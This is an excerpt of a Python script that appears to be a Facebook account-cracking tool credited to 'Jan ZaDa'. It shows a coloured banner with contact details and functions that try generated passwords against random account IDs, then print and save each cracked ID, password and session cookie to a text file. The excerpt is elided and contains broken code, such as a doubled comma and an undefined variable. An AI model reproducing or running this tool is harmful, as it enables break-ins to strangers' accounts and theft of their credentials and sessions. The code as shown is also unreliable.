...
logo ='''
\033[1;91m      
\033[1;91m         ❤ـــــﮩـ٨ـﮩـــღــﮩ٨ﮩﮩﮩﮩــ٨ـﮩ❤
\033[1;97m         ࿇⃝🌹⃢𝐄⃢🌹⃝࿇
\033[1;97m         Jan ZaDa
\033[1;91m         
\033[1;91m         
\033[1;97m    
\033[1;97m--------------------------------------------------
\033[1;91m Author      : Jan ZaDa
\033[1;91m GitHub      : Jan ZaDa
\033[1;91m watsapp     : 0771211599
\033[1;91m Facebook   : https://www.facebook.com/zulma.ayala.56
...
def afg_randome():
	...
	print('[?] Total Ok Id Save in  /sdcard/Jan ZaDa-OK.txt')
	print('[?] Total Cp Id Save in  /sdcard/Jan ZaDa-CP.txt')
	print(47*'-')
...
def rndm(ids,mking_pass):
	try:
		global ok,loop
		sys.stdout.write('\r\r\033[1;37m [Jan ZaDa-CRACK] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
...
response = requests.get('https://mbasic.facebook.com/', cookies=cookies,,headers=head).json()
			if 'session_key' in po:
				...
				print('\r\r\033[1;32m [Jan ZaDa-OK] '+str(uid)+' | '+pas+'\033[1;97m')
				print('\r\r\033[1;32m [COOKIES] %s   '%(coki))
				open('/sdcard/Jan ZaDa-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
				oks.append(str(uid))
				break
